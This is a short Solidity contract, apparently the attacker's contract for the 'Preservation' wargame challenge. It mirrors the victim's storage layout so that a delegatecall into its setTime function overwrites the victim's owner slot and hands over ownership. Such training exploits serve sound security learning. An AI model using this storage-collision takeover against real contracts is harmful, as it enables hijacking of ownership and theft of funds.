pragma solidity ^0.8.0;

import 'forge-std/console.sol';

contract PreservationHack {
  uint256 slot0 = uint256(1);
  uint256 slot1 = uint256(1);
  address owner;

  function setTime(uint256 _owner) public {
    owner = address(uint160(_owner));
  }
}
